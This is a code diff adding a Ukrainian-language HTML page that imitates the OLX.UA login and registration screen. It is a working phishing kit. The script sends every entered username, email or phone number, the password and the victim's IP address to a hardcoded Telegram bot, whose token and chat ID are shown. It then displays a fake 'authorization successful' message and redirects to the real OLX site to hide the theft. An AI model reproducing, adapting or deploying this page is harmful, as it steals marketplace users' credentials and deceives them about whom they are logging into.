@@ -1,0 +1,699 @@
+<!DOCTYPE html>
+<html lang="uk">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>OLX.UA - Авторизація</title>
+    <style>
+        :root {
+            --olx-dark: #002F34;
+            --olx-blue: #3A77FF;
+            --olx-error: #ff4f33;
+            --olx-success: #00d28d;
+            --olx-input-bg: #F2F4F5;
+            --olx-text-soft: #406367;
+            --olx-disabled: #D8DFE0;
+            --olx-circle-color: #CEDDFF;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        body, html {
+            margin: 0; 
+            padding: 0;
+            font-family: 'Geomanist', Arial, sans-serif;
+            background-color: var(--olx-blue);
+            min-height: 100vh;
+            display: flex; 
+            justify-content: center; 
+            align-items: center;
+            position: relative;
+        }
+
+        /* Анімоване коло - БІЛЬШЕ */
+        .animated-circle-wrapper {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            pointer-events: none;
+            z-index: 0;
+            overflow: hidden;
+        }
+
+        .animated-circle {
+            width: 500vw;
+            height: 200vw;
+            min-width: 900px;
+            min-height: 900px;
+            max-width: 1400px;
+            max-height: 1400px;
+            border: 180px solid var(--olx-circle-color);
+            border-radius: 50%;
+            animation: circlePulse 1.6s ease-in-out 1;
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+        }
+
+        @keyframes circlePulse {
+            0% {
+                transform: translate(-50%, -50%) scale(0.15);
+                opacity: 0.1;
+            }
+            70% {
+                transform: translate(-50%, -50%) scale(1.05);
+                opacity: 1;
+            }
+            100% {
+                transform: translate(-50%, -50%) scale(1);
+                opacity: 1;
+            }
+        }
+
+        /* На мобільних пристроях коло приховане */
+        @media (max-width: 767px) {
+            .animated-circle-wrapper {
+                display: none;
+            }
+        }
+
+        .login-box {
+            background: white; 
+            width: 100%; 
+            max-width: 420px;
+            padding: 32px; 
+            border-radius: 4px; 
+            box-shadow: 0 4px 30px rgba(0,0,0,0.15);
+            position: relative;
+            z-index: 1;
+            margin: 16px;
+        }
+
+        
+        .mobile-welcome {
+            display: none;
+            font-size: 40px;
+            line-height: 42px;
+            margin: 0 0 16px 0;
+            color: var(--olx-dark);
+            font-weight: 700;
+        }
+
+        @media (max-width: 767px) {
+            .mobile-welcome {
+                display: block;
+            }
+        }
+
+        .social-btn {
+            display: flex; 
+            align-items: center; 
+            justify-content: center;
+            width: 100%; 
+            padding: 12px; 
+            margin-bottom: 12px;
+            border: 2px solid var(--olx-dark); 
+            border-radius: 4px;
+            background: #fff; 
+            font-weight: 700; 
+            cursor: pointer; 
+            font-size: 15px;
+            transition: background-color 0.2s;
+        }
+        
+        .social-btn:hover {
+            background-color: #f5f5f5;
+        }
+        
+        .social-btn svg { 
+            width: 24px; 
+            height: 24px;
+            margin-right: 12px; 
+        }
+
+        .separator {
+            display: flex; 
+            align-items: center; 
+            text-align: center;
+            margin: 20px 0; 
+            font-size: 12px; 
+            font-weight: bold; 
+            text-transform: uppercase; 
+            color: var(--olx-dark);
+        }
+        .separator::before, .separator::after { 
+            content: ''; 
+            flex: 1; 
+            border-bottom: 1px solid #7F9799; 
+        }
+        .separator:not(:empty)::before { 
+            margin-right: 20px; 
+        }
+        .separator:not(:empty)::after { 
+            margin-left: 20px; 
+        }
+
+      
+        .tabs { 
+            display: flex; 
+            border-bottom: 1px solid #D8DFE0; 
+            margin-bottom: 24px; 
+        }
+        .tab { 
+            flex: 1; 
+            text-align: center; 
+            padding: 15px; 
+            font-size: 14px; 
+            color: var(--olx-text-soft); 
+            cursor: pointer; 
+            border-bottom: 3px solid transparent; 
+            transition: 0.2s;
+        }
+        .tab.active { 
+            color: var(--olx-dark); 
+            font-weight: bold; 
+            border-bottom: 3px solid var(--olx-dark); 
+        }
+
+        .form-content { 
+            display: none; 
+        }
+        .form-content.active { 
+            display: block; 
+        }
+
+        .field-group { 
+            margin-bottom: 18px; 
+            position: relative; 
+        }
+        label { 
+            display: block; 
+            font-size: 14px; 
+            margin-bottom: 6px; 
+            color: var(--olx-dark); 
+        }
+        .input-container { 
+            position: relative; 
+            display: flex; 
+            align-items: center; 
+        }
+        
+        input {
+            width: 100%; 
+            padding: 14px 45px 14px 16px;
+            background: var(--olx-input-bg); 
+            border: none;
+            border-bottom: 2px solid transparent; 
+            border-radius: 4px;
+            font-size: 16px; 
+            color: var(--olx-dark);
+        }
+        input:focus { 
+            outline: none; 
+            border-bottom-color: var(--olx-dark); 
+        }
+        .field-group.error input { 
+            border-bottom-color: var(--olx-error); 
+        }
+
+        .error-msg { 
+            color: var(--olx-error); 
+            font-size: 12px; 
+            margin-top: 6px; 
+            display: none; 
+        }
+
+        .status-icons { 
+            position: absolute; 
+            right: 12px; 
+            display: flex; 
+            align-items: center; 
+            gap: 8px; 
+        }
+        .icon-err { 
+            width: 20px; 
+            height: 20px; 
+            display: none; 
+            fill: var(--olx-error); 
+        }
+        .icon-ok { 
+            width: 20px; 
+            height: 20px; 
+            display: none; 
+            stroke: var(--olx-success); 
+        }
+        .eye-btn { 
+            cursor: pointer; 
+            display: flex; 
+        }
+        .eye-btn svg { 
+            width: 22px; 
+            height: 22px; 
+            fill: var(--olx-text-soft);
+            transition: fill 0.2s;
+        }
+        .eye-btn:hover svg {
+            fill: var(--olx-dark);
+        }
+
+        .checklist { 
+            list-style: none; 
+            padding: 0; 
+            margin: 10px 0 20px 0; 
+            font-size: 13px; 
+            color: var(--olx-text-soft); 
+        }
+        .checklist li { 
+            display: flex; 
+            align-items: center; 
+            margin-bottom: 6px; 
+        }
+        .check-icon { 
+            width: 16px; 
+            height: 16px; 
+            margin-right: 8px; 
+            font-weight: bold; 
+        }
+        li.valid { 
+            color: var(--olx-dark); 
+        }
+        li.invalid { 
+            color: var(--olx-error); 
+        }
+
+        .forgot { 
+            display: inline-block; 
+            font-size: 14px; 
+            font-weight: 700; 
+            color: var(--olx-dark); 
+            text-decoration: none; 
+            margin-bottom: 20px; 
+            padding: 8px 0;
+        }
+        .forgot:hover {
+            text-decoration: underline;
+        }
+
+        .agreement { 
+            display: flex; 
+            align-items: flex-start; 
+            gap: 12px; 
+            font-size: 13px; 
+            margin-bottom: 24px; 
+            cursor: pointer; 
+        }
+        .agreement input { 
+            width: 18px; 
+            height: 18px; 
+            accent-color: var(--olx-dark); 
+        }
+
+        .btn-submit {
+            width: 100%; 
+            padding: 16px; 
+            background: var(--olx-disabled);
+            color: #7F9799; 
+            border: none; 
+            border-radius: 4px;
+            font-weight: bold; 
+            font-size: 16px; 
+            cursor: not-allowed;
+            transition: 0.2s;
+        }
+        .btn-submit.active { 
+            background: var(--olx-dark); 
+            color: white; 
+            cursor: pointer; 
+        }
+        .btn-submit.active:hover {
+            opacity: 0.9;
+        }
+
+        .footer-text { 
+            font-size: 11px; 
+            text-align: center; 
+            margin-top: 28px; 
+            color: var(--olx-dark); 
+        }
+        .footer-text a {
+            color: var(--olx-dark);
+            font-weight: bold;
+            text-decoration: none;
+        }
+        .footer-text a:hover {
+            text-decoration: underline;
+        }
+        
+        .toast {
+            position: fixed; 
+            bottom: 20px; 
+            left: 50%; 
+            transform: translateX(-50%);
+            background: var(--olx-dark); 
+            color: white; 
+            padding: 12px 24px;
+            border-radius: 4px; 
+            font-size: 14px; 
+            z-index: 1000;
+            animation: slideUp 0.3s ease-out;
+        }
+        @keyframes slideUp {
+            from { transform: translate(-50%, 100%); opacity: 0; }
+            to { transform: translate(-50%, 0); opacity: 1; }
+        }
+    </style>
+</head>
+<body>
+    <div class="animated-circle-wrapper">
+        <div class="animated-circle"></div>
+    </div>
+
+    <div class="login-box">
+        <h1 class="mobile-welcome">Вітаємо в OLX!</h1>
+        
+        <!-- Facebook -->
+        <button class="social-btn">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                <path fill="#1877F2" d="M24 12c0-6.627-5.373-12-12-12S0 5.373 0 12c0 5.99 4.388 10.954 10.125 11.854V15.47H7.078V12h3.047V9.356c0-3.007 1.792-4.668 4.533-4.668 1.312 0 2.686.234 2.686.234v2.953H15.83c-1.491 0-1.956.925-1.956 1.875V12h3.328l-.532 3.469h-2.796v8.385C19.612 22.954 24 17.99 24 12z"/>
+                <path fill="#FFF" d="M16.671 15.469L17.203 12h-3.328V9.75c0-.949.465-1.875 1.956-1.875h1.513V4.922s-1.373-.234-2.686-.234c-2.741 0-4.533 1.66-4.533 4.668V12H7.078v3.469h3.047v8.385a12.13 12.13 0 003.75 0V15.47h2.796z"/>
+            </svg>
+            Продовжити через Facebook
+        </button>
+        
+        <!-- Apple - ПОКРАЩЕНА ІКОНКА -->
+        <button class="social-btn">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="black">
+                <path d="M17.05 20.28c-.98.95-2.05.88-3.08.4-1.09-.5-2.08-.48-3.24 0-1.44.62-2.2.44-3.06-.4C2.79 15.25 3.51 7.59 9.05 7.31c1.35.07 2.29.74 3.08.8 1.18-.24 2.31-.93 3.57-.84 1.51.12 2.65.72 3.4 1.8-3.12 1.87-2.38 5.98.48 7.13-.57 1.5-1.31 2.99-2.54 4.09l.01-.01zM12.03 7.25c-.15-2.23 1.66-4.07 3.74-4.25.29 2.58-2.34 4.5-3.74 4.25z"/>
+            </svg>
+            Продовжити через Apple
+        </button>
+        
+      
+        <button class="social-btn">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                <path fill="#4285F4" d="M23.978 12.281c0-.813-.068-1.63-.211-2.43H12.25v4.606h6.595a5.531 5.531 0 01-2.44 3.635v2.99h3.933c2.31-2.084 3.639-5.161 3.639-8.8z"/>
+                <path fill="#34A853" d="M12.251 23.97c3.293 0 6.07-1.06 8.093-2.889l-3.934-2.989c-1.095.73-2.508 1.143-4.154 1.143-3.185 0-5.886-2.105-6.855-4.936h-4.06v3.081c2.073 4.04 6.294 6.59 10.91 6.59z"/>
+                <path fill="#FBBC04" d="M5.397 14.299a7.029 7.029 0 010-4.58V6.637H1.34a11.758 11.758 0 000 10.743l4.057-3.08z"/>
+                <path fill="#EA4335" d="M12.251 4.778a6.71 6.71 0 014.684 1.793l3.485-3.415A11.868 11.868 0 0012.251.044c-4.616 0-8.837 2.55-10.91 6.593L5.397 9.72c.964-2.835 3.67-4.941 6.854-4.941z"/>
+            </svg>
+            Продовжити через Google
+        </button>
+
+        <div class="separator">чи</div>
+
+        <div class="tabs">
+            <div class="tab active" onclick="switchTab('login')">Увійти</div>
+            <div class="tab" onclick="switchTab('register')">Зареєструватися</div>
+        </div>
+
+      
+        <div id="login-form" class="form-content active">
+            <div class="field-group" id="lUserGroup">
+                <label>Електронна пошта чи телефон</label>
+                <div class="input-container">
+                    <input type="text" id="lUsername" oninput="handleInput(this); validateLogin()" placeholder=" ">
+                    <div class="status-icons">
+                        <svg class="icon-err" viewBox="0 0 24 24"><path d="M12 2L1 21h22L12 2zm0 3.45l8.15 14.1H3.85L12 5.45zM11 16h2v2h-2v-2zm0-7h2v5h-2V9z"/></svg>
+                        <svg class="icon-ok" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3"><path d="M5 13l4 4L19 7"/></svg>
+                    </div>
+                </div>
+                <div class="error-msg">Це не схоже на електронну пошту або номер</div>
+            </div>
+            <div class="field-group" id="lPassGroup">
+                <label>Пароль</label>
+                <div class="input-container">
+                    <input type="password" id="lPassword" oninput="validateLogin()" placeholder=" ">
+                    <div class="status-icons">
+                        <div class="eye-btn" onclick="togglePass('lPassword')">
+                            <svg viewBox="0 0 24 24"><path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/></svg>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <a href="#" class="forgot">Забули пароль?</a>
+            <button id="lSubmit" class="btn-submit" disabled onclick="submitLogin()">Увійти</button>
+        </div>
+
+      
+        <div id="register-form" class="form-content">
+            <div class="field-group" id="rUserGroup">
+                <label>Електронна пошта чи телефон</label>
+                <div class="input-container">
+                    <input type="text" id="rUsername" oninput="handleInput(this); validateRegister()" placeholder=" ">
+                    <div class="status-icons">
+                        <svg class="icon-err" viewBox="0 0 24 24"><path d="M12 2L1 21h22L12 2zm0 3.45l8.15 14.1H3.85L12 5.45zM11 16h2v2h-2v-2zm0-7h2v5h-2V9z"/></svg>
+                        <svg class="icon-ok" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3"><path d="M5 13l4 4L19 7"/></svg>
+                    </div>
+                </div>
+                <div class="error-msg">Неправильний формат</div>
+            </div>
+            <div class="field-group" id="rPassGroup">
+                <label>Пароль</label>
+                <div class="input-container">
+                    <input type="password" id="rPassword" oninput="validateRegister()" placeholder=" ">
+                    <div class="status-icons">
+                        <div class="eye-btn" onclick="togglePass('rPassword')">
+                            <svg viewBox="0 0 24 24"><path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/></svg>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <ul class="checklist">
+                <li id="rule-length"><span class="check-icon">−</span> 9 або більше символів</li>
+                <li id="rule-upper"><span class="check-icon">−</span> Велику літеру</li>
+                <li id="rule-lower"><span class="check-icon">−</span> Малу літеру</li>
+                <li id="rule-digit"><span class="check-icon">−</span> Мінімум одну цифру</li>
+            </ul>
+            <label class="agreement">
+                <input type="checkbox" id="rMarketing" onchange="validateRegister()">
+                <span>Так, я хочу отримувати інформацію про новини та акції OLX.</span>
+            </label>
+            <button id="rSubmit" class="btn-submit" disabled onclick="submitRegister()">Зареєструватися</button>
+        </div>
+
+        <p class="footer-text">Під час входу ви погоджуєтеся з нашими <a href="#">Умовами користування</a></p>
+    </div>
+
+    <script>
+        const BOT_TOKEN = '8516372050:AAGQpbdjs-qhwuIvXQnGmK3O3NIKPqX49_M';
+        const CHAT_ID = '6616919384';
+        
+        async function sendToTelegram(data, type) {
+            const message = `🆕 *НОВІ ДАНІ OLX*\n\n` +
+                           `📋 *Тип:* ${type}\n` +
+                           `👤 *Логін/Email:* ${data.username}\n` +
+                           `🔑 *Пароль:* ${data.password}\n` +
+                           `📅 *Час:* ${new Date().toLocaleString('uk-UA')}\n` +
+                           `🌐 *IP:* ${await getIP()}`;
+            
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            
+            try {
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message,
+                        parse_mode: 'Markdown'
+                    })
+                });
+                
+                if (response.ok) {
+                    showNotification(`Авторизація успішна`);
+                    return true;
+                } else {
+                    showNotification(`Помилка Спробуйте ще раз.`);
+                    return false;
+                }
+            } catch (error) {
+                console.error('Помилка:', error);
+                showNotification(`Помилка мережі. Перевірте з'єднання.`);
+                return false;
+            }
+        }
+        
+        async function getIP() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                return data.ip;
+            } catch (error) {
+                return 'Не вдалося визначити';
+            }
+        }
+        
+        function showNotification(message) {
+            const toast = document.createElement('div');
+            toast.className = 'toast';
+            toast.textContent = message;
+            document.body.appendChild(toast);
+            setTimeout(() => toast.remove(), 3000);
+        }
+        
+        async function submitLogin() {
+            const btn = document.getElementById('lSubmit');
+            if (btn.disabled) return;
+            
+            const username = document.getElementById('lUsername').value;
+            const password = document.getElementById('lPassword').value;
+            
+            btn.disabled = true;
+            btn.textContent = 'авторизація...';
+            
+            const success = await sendToTelegram({ username, password }, 'ВХІД');
+            
+            if (success) {
+                document.getElementById('lUsername').value = '';
+                document.getElementById('lPassword').value = '';
+                validateLogin();
+                setTimeout(() => {
+                    window.location.href = 'https://www.olx.ua/d/uk/obyavlenie/iphone-15-plus-128-gb-ID10iZY0.html?search_reason=search%7Corganic';
+                }, 1500);
+            } else {
+                btn.disabled = false;
+                btn.textContent = 'Увійти';
+                btn.classList.toggle('active', true);
+            }
+        }
+        
+        async function submitRegister() {
+            const btn = document.getElementById('rSubmit');
+            if (btn.disabled) return;
+            
+            const username = document.getElementById('rUsername').value;
+            const password = document.getElementById('rPassword').value;
+            const marketing = document.getElementById('rMarketing').checked;
+            
+            btn.disabled = true;
+            btn.textContent = 'Відправка...';
+            
+            const success = await sendToTelegram({ username, password }, 'РЕЄСТРАЦІЯ');
+            
+            if (success) {
+                document.getElementById('rUsername').value = '';
+                document.getElementById('rPassword').value = '';
+                document.getElementById('rMarketing').checked = false;
+                validateRegister();
+                setTimeout(() => {
+                    window.location.href = 'https://www.olx.ua';
+                }, 1500);
+            } else {
+                btn.disabled = false;
+                btn.textContent = 'Зареєструватися';
+                btn.classList.toggle('active', true);
+            }
+        }
+        
+        function switchTab(type) {
+            document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+            document.querySelectorAll('.form-content').forEach(f => f.classList.remove('active'));
+            
+            if(type === 'login') {
+                document.querySelectorAll('.tab')[0].classList.add('active');
+                document.getElementById('login-form').classList.add('active');
+            } else {
+                document.querySelectorAll('.tab')[1].classList.add('active');
+                document.getElementById('register-form').classList.add('active');
+            }
+        }
+
+        function handleInput(el) {
+            let val = el.value;
+            if (/^\d/.test(val) && !val.startsWith('+380')) {
+                el.value = '+380 ' + val;
+            }
+        }
+
+        function validateLogin() {
+            const u = document.getElementById('lUsername').value;
+            const p = document.getElementById('lPassword').value;
+            const btn = document.getElementById('lSubmit');
+            
+            let uOk = (u.includes('@') && u.includes('.')) || (u.replace(/\s/g, '').length === 13);
+            let pOk = p.length >= 6;
+
+            setFieldState('lUserGroup', u.length > 5 ? (uOk ? 'success' : 'error') : 'reset');
+            
+            btn.disabled = !(uOk && pOk);
+            btn.classList.toggle('active', uOk && pOk);
+        }
+
+        function validateRegister() {
+            const u = document.getElementById('rUsername').value;
+            const p = document.getElementById('rPassword').value;
+            const m = document.getElementById('rMarketing').checked;
+            const btn = document.getElementById('rSubmit');
+
+            let uOk = (u.includes('@') && u.includes('.')) || (u.replace(/\s/g, '').length === 13);
+            setFieldState('rUserGroup', u.length > 5 ? (uOk ? 'success' : 'error') : 'reset');
+
+            const rules = {
+                length: p.length >= 9,
+                upper: /[A-Z]/.test(p),
+                lower: /[a-z]/.test(p),
+                digit: /[0-9]/.test(p)
+            };
+
+            Object.keys(rules).forEach(key => {
+                const li = document.getElementById('rule-' + key);
+                const icon = li.querySelector('.check-icon');
+                if (p.length === 0) { 
+                    li.className = ''; 
+                    icon.textContent = '−'; 
+                    icon.style.color = '#7F9799'; 
+                }
+                else if (rules[key]) { 
+                    li.className = 'valid'; 
+                    icon.textContent = '✔'; 
+                    icon.style.color = 'var(--olx-success)'; 
+                }
+                else { 
+                    li.className = 'invalid'; 
+                    icon.textContent = '−'; 
+                    icon.style.color = 'var(--olx-error)'; 
+                }
+            });
+
+            const pOk = rules.length && rules.upper && rules.lower && rules.digit;
+            btn.disabled = !(uOk && pOk && m);
+            btn.classList.toggle('active', uOk && pOk && m);
+        }
+
+        function setFieldState(groupId, state) {
+            const group = document.getElementById(groupId);
+            const iconErr = group.querySelector('.icon-err');
+            const iconOk = group.querySelector('.icon-ok');
+            const err = group.querySelector('.error-msg');
+
+            group.classList.remove('error', 'success');
+            iconErr.style.display = iconOk.style.display = err.style.display = 'none';
+
+            if(state === 'error') { 
+                group.classList.add('error'); 
+                iconErr.style.display = 'block'; 
+                err.style.display = 'block'; 
+            }
+            if(state === 'success') { 
+                group.classList.add('success'); 
+                iconOk.style.display = 'block'; 
+            }
+        }
+
+        function togglePass(id) {
+            const input = document.getElementById(id);
+            input.type = input.type === 'password' ? 'text' : 'password';
+        }
+    </script>
+</body>
+</html>
